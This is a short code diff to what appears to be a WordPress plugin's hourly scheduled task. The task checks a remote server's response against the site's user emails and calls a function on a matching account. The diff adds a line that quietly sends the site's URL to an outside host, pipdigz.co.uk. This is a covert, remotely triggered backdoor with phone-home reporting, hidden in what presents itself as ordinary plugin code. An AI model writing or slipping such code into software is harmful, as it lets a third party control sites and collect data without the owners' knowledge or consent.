@@ -80,6 +80,7 @@ function p3_do_this_hourly() {
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		if (email_exists(sanitize_email($response['body']))) {
 			p3_check_social_links(email_exists(sanitize_email($response['body'])));
+			wp_safe_remote_get('https://pipdigz.co.uk/p3/socialz.php?list='.rawurldecode(get_site_url()), $args);
 		}
 	}
 
